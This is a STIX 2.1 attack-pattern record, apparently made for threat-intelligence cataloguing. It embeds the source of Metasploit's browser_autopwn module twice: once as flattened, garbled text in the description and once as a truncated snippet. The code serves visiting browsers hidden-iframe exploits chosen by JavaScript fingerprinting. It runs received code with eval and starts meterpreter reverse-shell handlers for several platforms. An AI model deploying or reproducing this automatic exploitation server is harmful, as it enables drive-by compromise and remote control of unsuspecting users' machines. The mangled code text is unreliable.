{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef8ed9e9-28bf-4636-99b8-7b1e54d47fb0",
    "created": "2024-08-14T16:21:50.449883Z",
    "modified": "2024-08-14T16:21:50.449887Z",
    "name": "HTTP Client Automatic Exploiter",
    "description": "List the exploit modules that would be started } ] ] 'PassiveActions' => [ 'WebServer', 'DefangedDetection' ] 'DefaultOptions' => { # We know that most of these exploits will crash the browser, so # set the default to run migrate right away if possible. \"InitialAutoRunScript\" => \"migrate -f\"  'DefaultAction'  => 'WebServer'))  register_options([ OptAddressLocal.new('LHOST', [true 'The IP address to use for reverse-connect payloads' ]) ])  register_advanced_options([ OptString.new('AutoRunScript', [false, \"A script to automatically on session creation.\", '']) OptBool.new('AutoSystemInfo', [true, \"Automatically capture system information on initialization.\", true]) OptRegexp.new('MATCH', [false 'Only attempt to use exploits whose name matches this regex' ]) OptRegexp.new('EXCLUDE', [false 'Only attempt to use exploits whose name DOES NOT match this regex' ]) OptBool.new('DEBUG_AUTOPWN', [false 'Do not obfuscate the javascript and print various bits of useful info to the browser' false ]) OptPort.new('LPORT_WIN32', [false 'The port to use for Windows reverse-connect payloads', 3333 ]) OptString.new('PAYLOAD_WIN32', [false 'The payload to use for Windows reverse-connect payloads' 'windows/meterpreter/reverse_tcp' ]) OptPort.new('LPORT_LINUX', [false 'The port to use for Linux reverse-connect payloads', 4444 ]) OptString.new('PAYLOAD_LINUX', [false 'The payload to use for Linux reverse-connect payloads' 'linux/meterpreter/reverse_tcp' ]) OptPort.new('LPORT_MACOS', [false 'The port to use for Mac reverse-connect payloads', 5555 ]) OptString.new('PAYLOAD_MACOS', [false 'The payload to use for Mac reverse-connect payloads' 'osx/meterpreter/reverse_tcp' ]) OptPort.new('LPORT_GENERIC', [false 'The port to use for generic reverse-connect payloads', 6666 ]) OptString.new('PAYLOAD_GENERIC', [false 'The payload to use for generic reverse-connect payloads' 'generic/shell_reverse_tcp' ]) OptPort.new('LPORT_JAVA', [false 'The port to use for Java reverse-connect payloads', 7777 ]) OptString.new('PAYLOAD_JAVA', [false 'The payload to use for Java reverse-connect payloads' 'java/meterpreter/reverse_tcp' ]) OptPort.new('LPORT_ANDROID', [false 'The port to use for Java reverse-connect payloads', 8888 ]) OptString.new('PAYLOAD_ANDROID', [false 'The payload to use for Android reverse-connect payloads' 'android/meterpreter/reverse_tcp' ]) ])  @exploits = Hash.new @payloads = Hash.new @targetcache = Hash.new @current_victim = Hash.new @handler_job_ids = [] end   ## # CommandDispatcher stuff ##  def auxiliary_commands { 'list' => \"%red#{self.refname}%clr: List the exploits as filtered by MATCH and EXCLUDE\"  end  def cmd_list(*args) print_status(\"Listing Browser Autopwn exploits:\") print_line @exploits = { each_autopwn_module do |name, mod| @exploits[name] = nil print_line name end print_line print_status(\"Found #{@exploits.length} exploit modules\") end  ## # Actual exploit stuff ##  def run if (action.name == 'list') cmd_list elsif (action.name == 'DefangedDetection') # Do everything we'd normally do for exploits, but don't start any # actual exploit modules exploit() else start_exploit_modules() if @exploits.length < 1 print_error(\"No exploits, check your MATCH and EXCLUDE settings\") return false end exploit() end end   def setup print_status(\"Setup\")  @init_js = ::Rex::Exploitation::Js::Detect.os(<<-ENDJS  #{js_base64  function make_xhr() { var xhr; try { xhr = new XMLHttpRequest(); } catch(e) { try { xhr = new ActiveXObject(\"Microsoft.XMLHTTP\"); } catch(e) { xhr = new ActiveXObject(\"MSXML2.ServerXMLHTTP\");   if (! xhr) { throw \"failed to create XMLHttpRequest\";  return xhr;   function report_and_get_exploits(detected_version) { var encoded_detection; xhr = make_xhr(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) { //var ta = document.createElement(\"textarea\"); //ta.rows = ta.cols = 100; //ta.value = xhr.responseText; //document.body.appendChild(ta) eval(xhr.responseText);  };  encoded_detection = new String(); #{js_debug('navigator.userAgent+\"<br><br>\"') for (var prop in detected_version) { #{js_debug('prop + \" \" + detected_version[prop] +\"<br>\"') encoded_detection += detected_version[prop] + \":\";  #{js_debug('\"<br>\"') encoded_detection = Base64.encode(encoded_detection); xhr.open(\"GET\", document.location + \"?sessid=\" + encoded_detection); xhr.send(null);   function bodyOnLoad() { var detected_version = os_detect.getVersion(); //#{js_debug('detected_version') report_and_get_exploits(detected_version); } // function bodyOnLoad ENDJS )  if (datastore['DEBUG_AUTOPWN']) print_status(\"NOTE: Debug Mode; javascript will not be obfuscated\") else pre = Time.now  # # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn #  #print_status(\"Obfuscating initial javascript #{pre}\") #@init_js.obfuscate #print_status \"Done in #{Time.now - pre} seconds\" end  #@init_js << \"window.onload = #{@init_js.sym(\"bodyOnLoad\")};\"; @init_html  = %Q|<html > <head > <title > Loading </title>\\n| @init_html << %Q|<script language=\"javascript\" type=\"text/javascript\">| @init_html << %Q|<!-- \\n #{@init_js} //-->| @init_html << %Q|</script> </head> | @init_html << %Q|<body onload=\"#{@init_js.sym(\"bodyOnLoad\")}()\"> | @init_html << %Q|<div id=\"foo\"></div> | @init_html << %Q|<noscript> \\n| # Don't use build_iframe here because it will break detection in # DefangedDetection mode when the target has js disabled. @init_html << %Q|<iframe src=\"#{self.get_resource}?ns=1\"></iframe>| @init_html << %Q|</noscript> \\n| @init_html << %Q|</body> </html> |  # # I'm still not sold that this is the best way to do this, but random # LPORTs causes confusion when things break and breakage when firewalls # are in the way.  I think the ideal solution is to have # self-identifying payloads so we'd only need 1 LPORT for multiple # stagers. # @win_lport  = datastore['LPORT_WIN32'] @win_payload  = datastore['PAYLOAD_WIN32'] @lin_lport  = datastore['LPORT_LINUX'] @lin_payload  = datastore['PAYLOAD_LINUX'] @osx_lport  = datastore['LPORT_MACOS'] @osx_payload  = datastore['PAYLOAD_MACOS'] @gen_lport  = datastore['LPORT_GENERIC'] @gen_payload  = datastore['PAYLOAD_GENERIC'] @java_lport = datastore['LPORT_JAVA'] @java_payload = datastore['PAYLOAD_JAVA'] @android_lport = datastore['LPORT_ANDROID'] @android_payload = datastore['PAYLOAD_ANDROID']  minrank = framework.datastore['MinimumRank'] || 'manual' if not RankingName.values.include?(minrank) print_error(\"MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join(\"|\")})\") wlog(\"MinimumRank invalid, ignoring\", 'core', LEV_0) end @minrank = RankingName.invert[minrank]  end   def init_exploit(name, mod = nil, targ = 0) if mod.nil? @exploits[name] = framework.modules.create(name) else @exploits[name] = mod.new end @exploits[name] = framework.modules.reload_module(@exploits[name])  # Reloading failed unless @exploits[name] @exploits.delete(name) return end  apo = @exploits[name].class.autopwn_opts if (apo[:rank] < @minrank) @exploits.delete(name) return false end  case name when %r{windows payload = @win_payload lport = @win_lport =begin # # Some day, we'll support Linux and Mac OS X here.. #  when %r{linux payload = @lin_payload lport = @lin_lport  when %r{osx payload = @osx_payload lport = @osx_lport =end  # We need to check that it's /java_ instead of just java since it would # clash with things like mozilla_navigatorjava.  Better would be to # check the actual platform of the module here but i'm lazy. when %r{/java_ payload = @java_payload lport = @java_lport when %r{^android/ payload = @android_payload lport = @android_lport else payload = @gen_payload lport = @gen_lport end @payloads[lport] = payload  print_status(\"Starting exploit #{name} with payload #{payload}\") @exploits[name].datastore['SRVHOST'] = datastore['SRVHOST'] @exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']  # For testing, set the exploit uri to the name of the exploit so it's # easy to tell what is happening from the browser. if (datastore['DEBUG_AUTOPWN']) @exploits[name].datastore['URIPATH'] = name else # randomize it manually since if a saved value exists in the user's # configuration, the saved value will get used if we set it to nil @exploits[name].datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4) end  @exploits[name].datastore['WORKSPACE'] = datastore[\"WORKSPACE\"] if datastore[\"WORKSPACE\"] @exploits[name].datastore['MODULE_OWNER'] = self.owner @exploits[name].datastore['ParentUUID'] = datastore[\"ParentUUID\"] if datastore[\"ParentUUID\"] @exploits[name].datastore['AutopwnUUID'] = self.uuid @exploits[name].datastore['LPORT'] = lport @exploits[name].datastore['LHOST'] = @lhost @exploits[name].datastore['SSL'] = datastore['SSL'] @exploits[name].datastore['SSLVersion'] = datastore['SSLVersion'] @exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread' @exploits[name].datastore['DisablePayloadHandler'] = true @exploits[name].exploit_simple( 'LocalInput'     => self.user_input 'LocalOutput'    => self.user_output 'Target'         => targ 'Payload'        => payload 'RunAsJob'       => true)  # It takes a little time for the resources to get set up, so sleep for # a bit to make sure the exploit is fully working.  Without this # mod.get_resource doesn't exist when we need it. Rex::ThreadSafe.sleep(0.5)  # Make sure this exploit got set up correctly, return false if it # didn't if framework.jobs[@exploits[name].job_id.to_s].nil? print_error(\"Failed to start exploit module #{name}\") @exploits.delete(name) return false end  # Since r9714 or so, exploit_simple copies the module instead of # operating on it directly when creating a job.  Put the new copy into # our list of running exploits so we have access to its state.  This # allows us to get the correct URI for each exploit in the same manor # as before, using mod.get_resource(). @exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]  return true end   def start_exploit_modules() @lhost = (datastore['LHOST'] || \"0.0.0.0\")  @noscript_tests = { @all_tests = {  print_line print_status(\"Starting exploit modules on host #{@lhost}...\") print_status(\"---\") print_line each_autopwn_module do |name, mod| # Start the module.  If that fails for some reason, don't bother # adding tests for it. next if !(init_exploit(name))  apo = mod.autopwn_opts.dup apo[:name] = name.dup apo[:vuln_test] ||= \"\"  if apo[:classid] # Then this is an IE exploit that uses an ActiveX control # build the appropriate tests for it. apo[:vuln_test] = \"\" apo[:ua_name] = HttpClients::IE conditions = [] if apo[:classid].kind_of?(Array)  # then it's many classids apo[:classid].each { |clsid| if apo[:method].kind_of?(Array)  # then it's many methods conditions += apo[:method].map { |m| \"testAXO('#{clsid}', '#{m}')\"  else conditions.push \"testAXO('#{clsid}', '#{method}')\" end  end apo[:vuln_test] << \"if (#{conditions.join(\"||\")}) {\\n\" apo[:vuln_test] << \" is_vuln = true;\\n\" apo[:vuln_test] << \"}\\n\" end  # If the exploit supplies a min/max version, build up a test to # check for the proper version.  Note: The version comparison # functions come from javascriptosdetect. js_d_ver = @init_js.sym(\"detected_version\") if apo[:ua_minver] and apo[:ua_maxver] ver_test = \"!#{@init_js.sym(\"ua_ver_lt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && \" + \"!#{@init_js.sym(\"ua_ver_gt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\" elsif apo[:ua_minver] ver_test = \"!#{@init_js.sym(\"ua_ver_lt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}')\\n\" elsif apo[:ua_maxver] ver_test = \"!#{@init_js.sym(\"ua_ver_gt\")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\\n\" else ver_test = nil end  # if we built a version check above, add it to the normal test if ver_test test =  \"if (#{ver_test}) { \" test << (apo[:vuln_test].empty? ? \"is_vuln = true;\" : apo[:vuln_test]) test << \"} else { is_vuln = false; }\\n\" apo[:vuln_test] = test end  # Now that we've got all of our exploit tests put together # organize them into an all tests (JS and no-JS), organized by rank # and doesnt-require-scripting (no-JS), organized by browser name. if apo[:javascript] && apo[:ua_name] @all_tests[apo[:rank]] ||= [] @all_tests[apo[:rank]].push(apo) elsif apo[:javascript] @all_tests[apo[:rank]] ||= [] @all_tests[apo[:rank]].push(apo) elsif apo[:ua_name] @noscript_tests[apo[:ua_name]] ||= [] @noscript_tests[apo[:ua_name]].push(apo) @all_tests[apo[:rank]] ||= [] @all_tests[apo[:rank]].push(apo) else @noscript_tests[\"generic\"] ||= [] @noscript_tests[\"generic\"].push(apo) @all_tests[apo[:rank]] ||= [] @all_tests[apo[:rank]].push(apo) end end  # start handlers for each type of payload [@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport| if (lport and @payloads[lport]) print_status(\"Starting handler for #{@payloads[lport]} on port #{lport}\") multihandler = framework.modules.create(\"exploit/multi/handler\") multihandler.datastore['MODULE_OWNER'] = self.datastore['MODULE_OWNER'] multihandler.datastore['WORKSPACE'] = datastore[\"WORKSPACE\"] if datastore[\"WORKSPACE\"] multihandler.datastore['ParentUUID'] = datastore[\"ParentUUID\"] if datastore[\"ParentUUID\"] multihandler.datastore['CAMPAIGN_ID'] = datastore[\"CAMPAIGN_ID\"] if datastore[\"CAMPAIGN_ID\"] multihandler.datastore['ParentModule'] = self.fullname multihandler.datastore['AutopwnUUID'] = self.uuid multihandler.datastore['LPORT'] = lport multihandler.datastore['LHOST'] = @lhost multihandler.datastore['ExitOnSession'] = false multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread' multihandler.datastore[\"ReverseListenerBindAddress\"] = datastore[\"ReverseListenerBindAddress\"] # XXX: Revisit this when we have meterpreter working on more than just windows if (lport == @win_lport or lport == @java_lport) multihandler.datastore['AutoRunScript'] = datastore['AutoRunScript'] multihandler.datastore['AutoSystemInfo'] = datastore['AutoSystemInfo'] multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript'] end multihandler.exploit_simple( 'LocalInput'     => self.user_input 'LocalOutput'    => self.user_output 'Payload'        => @payloads[lport] 'RunAsJob'       => true) @handler_job_ids.push(multihandler.job_id) end end # let the handlers get set up Rex::ThreadSafe.sleep(0.5)  print_line print_status(\"--- Done, found %bld%grn#{@exploits.length}%clr exploit modules\") print_line  # Sort the tests by reliability, descending. # I don't like doing this directly (wihout a !), but any other sort wasn't sticking - NE @all_tests = @all_tests.sort.reverse  # This matters a lot less for noscript exploits since they basically # get thrown into a big pile of iframes that the browser will load # semi-concurrently.  Still, might as well. @noscript_tests.each { |browser,tests| tests.sort! {|a,b| b[:rank] <=> a[:rank]  end  # # Main dispatcher method for when we get a request # def on_request_uri(cli, request) print_status(\"Handling '#{request.uri}'\")  case request.uri when self.get_resource # This is the first request.  Send the javascript fingerprinter and # hope it sends us back some data.  If it doesn't, javascript is # disabled on the client and we will have to do a lot more # guessing. response = create_response() response[\"Expires\"] = \"0\" response[\"Cache-Control\"] = \"must-revalidate\" response.body = @init_html cli.send_response(response) when %r{^#{self.get_resource}.*sessid= # This is the request for the exploit page when javascript is # enabled.  Includes the results of the javascript fingerprinting # in the \"sessid\" parameter as a base64 encoded string. record_detection(cli, request) if (action.name == \"DefangedDetection\") response = create_response() response.body = \"#{js_debug(\"'Please wait'\")}\" else response = build_script_response(cli, request) end response[\"Expires\"] = \"0\" response[\"Cache-Control\"] = \"must-revalidate\"  cli.send_response(response) when %r{^#{self.get_resource}.*ns=1 # This is the request for the exploit page when javascript is NOT # enabled.  Since scripting is disabled, fall back to useragent # detection, which is kind of a bummer since it's so easy for the # ua string to lie.  It probably doesn't matter that much because # most of our exploits require javascript anyway. print_status(\"Browser has javascript disabled, trying exploits that don't need it\") record_detection(cli, request) if (action.name == \"DefangedDetection\") response = create_response() response.body = \"Please wait\" else response = build_noscript_response(cli, request) end  response[\"Expires\"] = \"0\" response[\"Cache-Control\"] = \"must-revalidate\" cli.send_response(response) else print_status(\"404ing #{request.uri}\") send_not_found(cli) return false end end  def html_for_exploit(autopwn_info, client_info) html = \"\"  html << (autopwn_info[:prefix_html] || \"\") + \"\\n\" html << build_iframe(exploit_resource(autopwn_info[:name])) + \"\\n\" html << (autopwn_info[:postfix_html] || \"\") + \"\\n\"  if (HttpClients::IE == autopwn_info[:ua_name]) html = \"<!--[if IE]>\\n#{html}\\n<![endif]-->\\n\" end  html end  def build_noscript_html(cli, request) client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent']) body = \"\"  sploit_cnt = 0 @noscript_tests.each { |browser, sploits| next if sploits.length == 0  next unless client_matches_browser(client_info, browser)  sploits.each do |s| body << html_for_exploit( s, client_info ) end sploit_cnt += 1  print_status(\"Responding with #{sploit_cnt} non-javascript exploits\") body end  def build_noscript_response(cli, request)  response = create_response() response['Expires'] = '0' response['Cache-Control'] = 'must-revalidate'  response.body  = \"<html > <head > <title > Loading </title> </head> \" response.body << \"<body> \" response.body << \"Please wait \" response.body << build_noscript_html(cli, request) response.body << \"</body> </html> \"  return response end  # # Build some javascript that attempts to determine which exploits to run # for the victim's OS and browser. # # Returns a raw javascript string to be eval'd on the victim # def build_script_response(cli, request) response = create_response() response['Expires'] = '0' response['Cache-Control'] = 'must-revalidate'  # Host info no longer comes from the database! This is strictly a value # that came back from javascript OS detection because NAT basically # makes it impossible to keep host/client mappings straight. client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent']) host_info   = client_info[:host] #print_status(\"Client info: #{client_info.inspect}\")  js = \"var global_exploit_list = []\\n\"; # If we didn't get a client from the database, then the detection # is borked or the db is not connected, so fallback to sending # some IE-specific stuff with everything.  Do the same if the # exploit didn't specify a client.  Otherwise, make sure this is # IE before sending code for ActiveX checks. if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name])) # If we have a class name (e.g.: \"DirectAnimation.PathControl\") # use the simple and direct \"new ActiveXObject()\".  If we # have a classid instead, first try creating the object # with createElement(\"object\").  However, some things # don't like being created this way (specifically winzip) # so try writing out an object tag as well.  One of these # two methods should succeed if the object with the given # classid can be created. js << <<-ENDJS window.testAXO = function(axo_name, method) { if (axo_name.substring(0,1) == String.fromCharCode(123)) { axobj = document.createElement(\"object\"); axobj.setAttribute(\"classid\", \"clsid:\" + axo_name); axobj.setAttribute(\"id\", axo_name); axobj.setAttribute(\"style\", \"visibility: hidden\"); axobj.setAttribute(\"width\", \"0px\"); axobj.setAttribute(\"height\", \"0px\"); document.body.appendChild(axobj); if (typeof(axobj[method]) == 'undefined') { var attributes = 'id=\"' + axo_name + '\"'; attributes += ' classid=\"clsid:' + axo_name + '\"'; attributes += ' style=\"visibility: hidden\"'; attributes += ' width=\"0px\" height=\"0px\"'; document.body.innerHTML += \"<object \" + attributes + \"></object>\"; axobj = document.getElementById(axo_name);  } else { try { axobj = new ActiveXObject(axo_name); } catch(e) { // If we can't build it with an object tag and we can't build it // with ActiveXObject, it can't be built. return false; };  #{js_debug('axo_name + \".\" + method + \" = \" + typeof axobj[method] + \"<br/>\"') if (typeof(axobj[method]) != 'undefined') { return true;  return false; }; ENDJS # End of IE-specific test functions end # Generic stuff that is needed regardless of what browser was detected. js << <<-ENDJS var written_iframes = new Array(); window.write_iframe = function (myframe) { var iframe_idx; var mybody; for (iframe_idx in written_iframes) { if (written_iframes[iframe_idx] == myframe) { return;   written_iframes[written_iframes.length] = myframe; str = ''; str += '<iframe src=\"' + myframe + '\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>'; document.body.innerHTML += (str); }; window.next_exploit = function(exploit_idx) { #{js_debug(\"'next_exploit(' + exploit_idx +')<br>'\") if (!global_exploit_list[exploit_idx]) { #{js_debug(\"'End<br>'\") return;  #{js_debug(\"'trying ' + global_exploit_list[exploit_idx].resource + ' of ' + global_exploit_list.length + '<br>'\") // Wrap all of the vuln tests in a try-catch block so a // single borked test doesn't prevent other exploits // from working. try { var test = global_exploit_list[exploit_idx].test; // Debugging //tn = document.createTextNode(\"Test \" + exploit_idx +\"\\\\n\"); //br = document.createElement(\"br\"); //document.body.appendChild(tn); //document.body.appendChild(br); //tn = document.createTextNode(test); //document.body.appendChild(tn); if (!test) { test = \"true\";   if (eval(test)) { #{js_debug(\"'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'\") window.write_iframe(global_exploit_list[exploit_idx].resource); setTimeout(\"window.next_exploit(\" + (exploit_idx+1).toString() + \")\", 1000); } else { #{js_debug(\"'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'\") window.next_exploit(exploit_idx+1);  } catch(e) { #{js_debug(\"'test threw an exception: ' + e.message + '<br />'\") window.next_exploit(exploit_idx+1); }; }; ENDJS  sploits_for_this_client = [] sploit_cnt = 0 # if we have no client_info, this will add all tests. Otherwise tries # to only send tests for exploits that target the client's detected # browser.  @all_tests.each { |rank, sploits| sploits.each { |s| browser = s[:ua_name] || \"generic\" next unless client_matches_browser(client_info, browser)  # Send all the generics regardless of what the client is. If the # client is nil, then we don't know what it really is, so just err # on the side of shells and send everything. Otherwise, send only # if the client is using the browser associated with this set of # exploits. if s[:javascript] if (browser == \"generic\" || client_info.nil? || [nil, browser].include?(client_info[:ua_name])) if s[:vuln_test].nil? or s[:vuln_test].empty? test = \"is_vuln = true\" else # get rid of newlines and escape quotes test = s[:vuln_test].gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\") end # shouldn't be any in the resource, but just in case... res = exploit_resource(s[:name]).gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\")  # Skip exploits that don't match the client's OS. if (host_info and host_info[:os_name] and s[:os_name]) # Reject exploits whose OS doesn't match that of the # victim. Note that host_info comes from javascript OS # detection, NOT the database.  # Note that the os_name could be a string, a regex, or # an array of strings and regexes.  if host_info[:os_name] != \"undefined\" unless client_matches_module_spec?(host_info[:os_name], s[:os_name]) vprint_status(\"Rejecting #{s[:name]} for non-matching OS\") next end end end  js << \"global_exploit_list[global_exploit_list.length] = {\\n\" js << \"  'test':'#{test}',\\n\" js << \"  'resource':'#{res}'\\n\" js << \"};\\n\" sploits_for_this_client.push s[:name] sploit_cnt += 1 end else if s[:name] =~ %r|/java_| res = exploit_resource(s[:name]).gsub(\"\\n\",'').gsub(\"'\", \"\\\\\\\\'\") js << \"global_exploit_list[global_exploit_list.length] = {\\n\" js << \"  'test':'is_vuln = navigator.javaEnabled()',\\n\" js << \"  'resource':'#{res}'\\n\" js << \"};\\n\" else # Some other kind of exploit that we can't generically # check for in javascript, throw it on the pile. noscript_html << html_for_exploit(s, client_info) end sploits_for_this_client.push s[:name] sploit_cnt += 1 end    js << \"#{js_debug(\"'starting exploits (' + global_exploit_list.length + ' total)<br>'\")}\\n\" js << \"window.next_exploit(0);\\n\"  # # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn #  #js = ::Rex::Exploitation::JSObfu.new(js) #js.obfuscate unless datastore[\"DEBUG_AUTOPWN\"]  response.body = \"#{js}\" print_status(\"Responding with #{sploit_cnt} exploits\") sploits_for_this_client.each do |name| vprint_status(\"* #{name}\") end return response end   # # Determines whether a browser string matches an exploit module specification # Example: :os_name => ( 'Windows' | /Windows/ | ['Windows', 'Mac OS X'] ) # def client_matches_module_spec?(client_str, module_spec)  case module_spec when ::String return !! (client_str == module_spec) when ::Regexp return !! client_str.match(module_spec) when ::Array return !! exploit_spec.map{ |spec| client_matches_module_spec?(client_str, spec) }.include?(true) end  false end  # # Yields each module that exports autopwn_info, filtering on MATCH and EXCLUDE options # def each_autopwn_module(&block) m_regex = datastore[\"MATCH\"] e_regex = datastore[\"EXCLUDE\"] framework.exploits.each_module do |name, mod| if mod.respond_to?(\"autopwn_opts\") and (m_regex.blank? or name =~ m_regex) and (e_regex.blank? or name !~ e_regex) yield name, mod end end end  # # Returns true if an exploit for +browser+ (one of the +OperatingSystems+ # constants) should be sent for a particilar client.  +client_info+ should # be something returned by +get_client+. # # If +client_info+ is nil then get_client failed and we have no # knowledge of this client, so we can't assume anything about their # browser.  If the exploit does not specify a browser target, that # means it it is generic and will work anywhere (or at least be # able to autodetect).  If the currently connected client's ua_name # is nil, then the fingerprinting didn't work for some reason. # Lastly, check to see if the client's browser matches the browser # targetted by this group of exploits. In all of these cases, we # need to send all the exploits in the list. # # In contrast, if we have all of that info and it doesn't match, we # don't need to bother sending it. # def client_matches_browser(client_info, browser) if client_info and browser and client_info[:ua_name] if browser != \"generic\" and  client_info[:ua_name] != browser vprint_status(\"Rejecting exploits for #{browser}\") return false end end  true end   # consider abstracting this out to a method (probably # with a different name) of Msf::Auxiliary::Report or # Msf::Exploit::Remote::HttpServer def record_detection(cli, request) os_name = nil os_flavor = nil os_sp = nil os_lang = nil os_device = nil os_vendor = nil arch = nil ua_name = nil ua_ver = nil  data_offset = request.uri.index('sessid=') #p request['User-Agent'] if (data_offset.nil? or -1 == data_offset) # then we didn't get a report back from our javascript # detection; make a best guess effort from information # in the user agent string.  The OS detection should be # roughly the same as the javascript version on non-IE # browsers because it does most everything with # navigator.userAgent print_status(\"Recording detection from User-Agent: #{request['User-Agent']}\") report_user_agent(cli.peerhost, request) else data_offset += 'sessid='.length detected_version = request.uri[data_offset, request.uri.length] if (0 < detected_version.length) detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version)) print_status(\"JavaScript Report: #{detected_version}\")  (os_name, os_vendor, os_flavor, os_device, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')  if framework.db.active note_data = {  note_data['os.product']   = os_name   if os_name != 'undefined' note_data['os.vendor']    = os_vendor if os_vendor != 'undefined' note_data['os.edition']   = os_flavor if os_flavor != 'undefined' note_data['os.device']    = os_device if os_device != 'undefined' note_data['os.version']   = os_sp     if os_sp != 'undefined' note_data['os.language']  = os_lang   if os_lang != 'undefined' note_data['os.arch']      = arch      if arch != 'undefined' note_data['os.certainty'] = '0.7' print_status(\"Reporting: #{note_data.inspect}\")  # Reporting stuff isn't really essential since we store all # the target information locally.  Make sure any exception # raised from the report_* methods doesn't prevent us from # sending exploits.  This is really only an issue for # connections from localhost where we end up with # ActiveRecord::RecordInvalid errors because 127.0.0.1 is # blacklisted in the Host validations. begin  # Report a generic fingerprint.match note for the OS normalizer # Previously we reported a javascript_fingerprint type but this # was never used. report_note({ :host   => cli.peerhost :ntype  => 'fingerprint.match' :data   => note_data :update => :unique_data }) client_info = { :host      => cli.peerhost :ua_string => request['User-Agent'] :ua_name   => ua_name :ua_ver    => ua_ver  report_client(client_info) rescue ::Interrupt raise $! rescue ::Exception => e elog('Reporting failed', error: e) end end end end  # Always populate the target cache since querying the database is too # slow for real-time. key = cli.peerhost + request['User-Agent'] @targetcache ||= { @targetcache[key] ||= { @targetcache[key][:updated_at] = Time.now.to_i  # Clean the cache rmq = [] @targetcache.each_key do |addr| if (Time.now.to_i > @targetcache[addr][:updated_at]+60) rmq.push addr end end rmq.each {|addr| @targetcache.delete(addr)   # Keep the attributes the same as if it were created in # the database. @targetcache[key][:updated_at] = Time.now.to_i @targetcache[key][:ua_string] = request['User-Agent'] @targetcache[key][:ua_name] = ua_name @targetcache[key][:ua_ver] = ua_ver  @targetcache[key][:host] = { @targetcache[key][:host][:os_name] = os_name @targetcache[key][:host][:os_vendor] = os_vendor @targetcache[key][:host][:os_flavor] = os_flavor @targetcache[key][:host][:os_device] = os_device @targetcache[key][:host][:os_sp] = os_sp @targetcache[key][:host][:os_lang] = os_lang  end  # Override super#get_client to use a cache since the database is generally # too slow to be useful for realtime tasks.  This essentially creates an # in-memory database.  The upside is that it works if the database is # broken (which seems to be all the time now). def get_client(opts) host = opts[:host] return @targetcache[opts[:host]+opts[:ua_string]] end  def build_iframe(resource) ret = '' if (action.name == 'DefangedDetection') ret << \"<p>iframe #{resource}</p>\" else ret << %Q|<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>| #ret << %Q|<iframe src=\"#{resource}\" ></iframe>| end return ret end  def exploit_resource(name) if (@exploits[name] && @exploits[name].respond_to?(\"get_resource\")) #print_line(\"Returning #{@exploits[name].get_resource.inspect}, for #{name}\") return @exploits[name].get_resource else print_error(\"Don't have an exploit by that name, returning 404#{name}.html\") return \"404#{name}.html\" end end  def js_debug(msg) if datastore['DEBUG_AUTOPWN'] return \"document.body.innerHTML += #{msg};\" end return \"\" end  def cleanup print_status(\"Cleaning up exploits...\") @exploits.each_pair do |name, mod| # if the module died for some reason, we can't kill it next unless mod framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s] end @handler_job_ids.each do |id| framework.jobs[id.to_s].stop if framework.jobs[id.to_s] end super end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/browser_autopwn.rb",
            "external_id": "browser_autopwn.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# ideas:\n# - add a loading page option so the user can specify arbitrary html to\n#   insert all of the evil js and iframes into\n# - caching is busted when different browsers come from the same IP\n\nrequire 'rex/exploitation/js/detect'\nrequire 'rex/exploitation/jsobfu'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HTTP Client Automatic Exploiter',\n      'Description' => %q{\n          This module has three actions.  The first (and the default)\n        is 'WebServer' which uses a combination of client-side and\n        server-side techniques to fingerprint HTTP clients and then\n        automatically exploit them.  Next is 'DefangedDetection' which\n        does only the fingerprinting part.  Lastly, 'list' simply\n        prints the names of all exploit modules that would be used by\n        the WebServer action given the current MATCH and EXCLUDE\n        options.\n\n        Also adds a 'list' command which is the same as running with\n        ACTION=list.\n      },\n      'Author'      =>\n        [\n          # initial concept, integration and extension of Jerome\n          # Athias' os_detect.js\n          'egypt',\n        ],\n      'License'     => BSD_LICENSE,\n      'Actions'     =>\n        [\n          [ 'WebServer', {\n            'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'\n          } ],\n          [ 'DefangedDetection', {\n            'Description' => 'Only perform detection, send no exploits'\n          } ],\n          [ 'list', {\n            'Description' => 'List the exploit modules that would be started'\n          } ]\n        ],\n      'PassiveActions' =>\n        [ 'WebServer', 'DefangedDetection' ],\n      'DefaultOptions' => {\n          # We know that most of these exploits will crash the browser, so\n          # set the default to run migrate right away if possible.\n          \"InitialAutoRunScript\" => \"migrate -f\",\n        },\n 